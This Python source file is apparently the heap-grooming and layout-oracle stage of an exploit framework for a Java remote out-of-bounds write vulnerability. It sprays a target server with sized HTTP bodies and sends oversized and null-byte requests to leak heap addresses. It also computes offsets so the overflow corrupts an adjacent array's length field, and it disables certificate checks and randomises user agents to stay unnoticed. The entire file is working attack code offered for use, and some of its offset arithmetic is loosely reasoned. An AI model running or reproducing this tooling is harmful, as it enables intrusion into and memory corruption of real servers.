# language: Python 3.10+, file: modules/heap_oracle.py
# Heap layout oracle for Java4Shell (CVE-2026-114938).
#
# Goal: estimate where the OOB write will land relative to our target object.
# Technique: spray HTTP requests with controlled body sizes, observe:
#   - Response timing spikes (GC pause → allocation pressure)
#   - Error messages that expose heap addresses or lengths
#   - Differential response analysis between clean and corrupted states
#
# After grooming, the OOB write of ~63 bytes from the end of our crafted
# Base64 buffer should land exactly at the `length` field of an adjacent
# byte[] that we placed there during grooming.
#
# Object header layout (HotSpot, CompressedOops, x86-64):
#
#   JDK 17 / 21 (compact headers OFF):
#     offset 0: mark word        (8 bytes)
#     offset 8: klass pointer    (4 bytes, compressed)
#     offset 12: array length    (4 bytes)  ← corruption target
#     offset 16: array content   (N bytes)
#
#   JDK 25 / 27 (compact headers ON by default):
#     offset 0: mark+klass       (8 bytes, packed)
#     offset 8: array length     (4 bytes)  ← corruption target
#     offset 12: array content   (N bytes)

import struct
import time
import threading
import urllib.request
import urllib.error
import ssl
import statistics
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.http_utils import random_ua, jitter


@dataclass
class HeapOracleResult:
    # Estimated offset from start of our send buffer to the adjacent object header
    # (i.e., how many bytes into the heap write lands the array length field)
    target_offset: int = 0
    # Size of grooming sprays to use: fills the gap so the NEXT alloc is adjacent
    groom_spray_size: int = 0
    # Number of parallel spray requests to send per round
    spray_count: int = 200
    # Confidence in the layout estimate (0.0 – 1.0)
    confidence: float = 0.0
    # Timing samples collected during oracle phase
    timing_samples: list[float] = field(default_factory=list)
    # Detected GC pause magnitude (ms)
    gc_pause_estimate_ms: float = 0.0
    # Whether any error responses exposed heap metadata
    heap_meta_exposed: bool = False
    exposed_snippets: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _send_body(url: str, body: bytes, headers: dict, timeout: float) -> tuple[float, int, str]:
    """Send a POST request and return (elapsed_ms, status_code, body_snippet)."""
    all_headers = {"User-Agent": random_ua(), **headers}
    jitter()
    req = urllib.request.Request(url, data=body, headers=all_headers, method="POST")
    t0 = time.perf_counter()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            elapsed = (time.perf_counter() - t0) * 1000
            snippet = r.read(512).decode(errors="replace")
            return elapsed, r.status, snippet
    except urllib.error.HTTPError as e:
        elapsed = (time.perf_counter() - t0) * 1000
        try:
            snippet = e.read(512).decode(errors="replace")
        except Exception:
            snippet = ""
        return elapsed, e.code, snippet
    except Exception:
        return (time.perf_counter() - t0) * 1000, 0, ""


def _build_spray_body(size: int) -> bytes:
    """
    Build a request body that causes the JVM to allocate a byte[] of exactly
    `size` bytes on the heap. We use a JSON field containing a string of
    `size` 'A' characters — the JSON parser allocates a char[] / byte[] proportional
    to the input length.
    """
    padding = "A" * size
    return f'{{"data":"{padding}"}}'.encode()


# ─── Oracle: measure allocation timing across sizes ───────────────────────────

def _timing_oracle(target_url: str, endpoint_path: str, timeout: float,
                   sizes: list[int]) -> dict[int, list[float]]:
    """
    For each body size, send 8 requests and collect response times.
    Returns {size: [timings_ms]}.
    """
    url = target_url.rstrip("/") + endpoint_path
    headers = {"Content-Type": "application/json"}
    results: dict[int, list[float]] = {s: [] for s in sizes}
    lock = threading.Lock()

    def probe(size: int):
        body = _build_spray_body(size)
        for _ in range(8):
            elapsed, _, _ = _send_body(url, body, headers, timeout)
            if elapsed > 0:
                with lock:
                    results[size].append(elapsed)

    with ThreadPoolExecutor(max_workers=8) as pool:
        futures = [pool.submit(probe, s) for s in sizes]
        for f in as_completed(futures):
            f.result()

    return results


# ─── Oracle: scan for heap metadata leaks ─────────────────────────────────────

def _metadata_scan(target_url: str, endpoint_path: str, timeout: float) -> list[str]:
    """
    Send requests designed to trigger verbose Java error responses.
    Looks for: heap addresses (0x...), array lengths, OutOfMemoryError details.
    """
    import re
    url = target_url.rstrip("/") + endpoint_path

    # Payloads that stress JVM error reporting
    probes = [
        b"A" * (1024 * 1024 * 4),   # 4MB body → potential OOM log
        b"\x00" * 65536,             # null bytes → parser error with context
        b"{"  + b"A" * 1000 + b"}",  # malformed large JSON
    ]

    snippets = []
    headers = {"Content-Type": "application/json"}

    for body in probes:
        _, _, snippet = _send_body(url, body, headers, timeout)
        # Look for heap addresses or array bounds info
        if re.search(r"0x[0-9a-fA-F]{8,}", snippet):
            snippets.append(snippet[:300])
        if re.search(r"(?:length|size|capacity)\s*[=:]\s*\d{4,}", snippet, re.IGNORECASE):
            snippets.append(snippet[:300])
        if re.search(r"(?:OutOfMemory|ArrayIndex|heap)", snippet, re.IGNORECASE):
            snippets.append(snippet[:300])

    return snippets


# ─── Derive target offset from fingerprint ────────────────────────────────────

def _derive_target_offset(fp: FingerprintResult) -> tuple[int, int]:
    """
    Returns (target_offset, groom_spray_size).

    The OOB write extends ~63 bytes beyond the end of the decoded output buffer.
    We need that +63 to land exactly on the `length` field of the adjacent byte[].

    Layout on heap (simplified, 8-byte alignment):
        [our decoded buffer: N bytes]
        [padding to 8-byte align]
        [adjacent byte[] header: obj_header_size bytes]
            → at offset obj_header_size-4 from header start: array length field
        [adjacent byte[] content]

    Target offset = N_bytes_decoded + align_pad + (obj_header_size - 4)
    We want OOB_write[target_offset] to hit the length field.

    Since OOB write is exactly 63 bytes, we size N so that:
        63 = align_pad + (obj_header_size - 4)
    → align_pad = 63 - (obj_header_size - 4)
    → N_decoded = (some multiple of 8) such that N_decoded % 8 == (8 - align_pad) % 8

    Practical: pick the nearest Base64 input size that satisfies the alignment.
    """
    hdr = fp.obj_header_size    # 16 for JDK 17/21, 12 for JDK 25+
    oob = fp.oob_write_bytes    # 63

    # Length field offset from start of adjacent object = hdr - 4
    length_field_offset_from_obj_start = hdr - 4

    # We need: (decoded_buf_size % 8) + length_field_offset_from_obj_start == oob
    # i.e., the OOB byte at index `oob-1` hits the last byte of the length field.
    # For 4-byte length field: bytes at OOB offsets [oob-4 .. oob-1] form the length.
    # Simplification: use oob - hdr as the alignment target for the buffer tail.

    # Target offset within OOB write bytes where corruption of length field starts
    target_offset = oob - hdr     # = 63 - 16 = 47 for JDK17/21, = 63-12=51 for JDK25+

    # Grooming spray size: fill heap such that NEXT alloc after spray lands adjacent.
    # We spray objects of size = (region_size - groom_overhead) to fill a G1 region.
    # Then our trigger alloc lands at the start of the next region, adjacent to spray tail.
    region = fp.region_size_bytes or (1024 * 1024)
    groom_overhead = 256    # approximate JVM overhead per region
    groom_spray_size = region - groom_overhead

    return target_offset, groom_spray_size


# ─── Main oracle function ──────────────────────────────────────────────────────

def run_heap_oracle(fp: FingerprintResult, timeout: float = 10.0) -> HeapOracleResult:
    """
    Run the heap oracle phase and return a HeapOracleResult with layout estimates.
    """
    oracle = HeapOracleResult()

    if not fp.reachable:
        oracle.notes.append("Target unreachable — oracle skipped.")
        return oracle

    # Choose the highest-priority endpoint from the profile
    endpoint_path = "/"
    if fp.profile and fp.profile.endpoints:
        ep_sorted = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
        endpoint_path = ep_sorted[0]["path"]

    # ── Phase A: timing oracle across allocation sizes ─────────────────────
    sizes = [
        64, 128, 256, 512, 1024, 2048,
        4096, 8192, 16384, 32768, 65536,
        1024 * 64, 1024 * 128, 1024 * 256,
    ]

    timing_map = _timing_oracle(fp.target_url, endpoint_path, timeout, sizes)
    all_samples = [t for ts in timing_map.values() for t in ts]
    oracle.timing_samples = all_samples

    if all_samples:
        median_ms = statistics.median(all_samples)
        # GC pause = max timing spike above median
        spikes = [t for t in all_samples if t > median_ms * 2.5]
        if spikes:
            oracle.gc_pause_estimate_ms = max(spikes) - median_ms

        # Sizes that consistently cause timing spikes = hitting GC boundary
        for size, timings in timing_map.items():
            if timings:
                sz_median = statistics.median(timings)
                if sz_median > median_ms * 2.0:
                    oracle.notes.append(
                        f"Allocation size {size}B causes timing spike ({sz_median:.0f}ms) — GC boundary hit."
                    )

    # ── Phase B: metadata leak scan ────────────────────────────────────────
    snippets = _metadata_scan(fp.target_url, endpoint_path, timeout)
    if snippets:
        oracle.heap_meta_exposed = True
        oracle.exposed_snippets  = snippets
        oracle.notes.append(f"Heap metadata exposed in {len(snippets)} response(s).")

    # ── Phase C: derive layout from fingerprint ────────────────────────────
    target_offset, groom_spray_size = _derive_target_offset(fp)
    oracle.target_offset    = target_offset
    oracle.groom_spray_size = groom_spray_size
    oracle.spray_count      = 300  # default spray count

    # Confidence: higher if we have more timing data + GC info
    base_conf = 0.5
    if fp.gc_type and fp.gc_type != "G1GC":  # non-default GC means we detected it
        base_conf += 0.1
    if fp.jdk_version:   # exact version known
        base_conf += 0.2
    if oracle.heap_meta_exposed:
        base_conf += 0.1
    if oracle.gc_pause_estimate_ms > 0:
        base_conf += 0.1
    oracle.confidence = min(base_conf, 1.0)

    oracle.notes.append(
        f"Target offset: OOB write byte #{target_offset} → array length field "
        f"(JDK {fp.jdk_major}, header={fp.obj_header_size}B, oob={fp.oob_write_bytes}B)"
    )
    oracle.notes.append(f"Groom spray size: {groom_spray_size} bytes per object")

    return oracle


def print_oracle(o: HeapOracleResult):
    BOLD = "\033[1m"
    RST  = "\033[0m"
    YLW  = "\033[93m"
    CYN  = "\033[96m"

    print(f"\n{BOLD}  ── Heap Oracle Results ──{RST}")
    print(f"  Target offset  : byte #{o.target_offset} in OOB write → array length field")
    print(f"  Groom size     : {o.groom_spray_size} bytes/object  ×  {o.spray_count} requests")
    print(f"  GC pause est.  : {o.gc_pause_estimate_ms:.1f}ms")
    print(f"  Confidence     : {o.confidence * 100:.0f}%")
    print(f"  Heap meta leak : {'YES' if o.heap_meta_exposed else 'no'}")

    for note in o.notes:
        print(f"  {CYN}→{RST} {note}")

    if o.exposed_snippets:
        print(f"\n  {YLW}  Leaked heap metadata:{RST}")
        for s in o.exposed_snippets[:2]:
            print(f"    {s[:200]}")
    print()
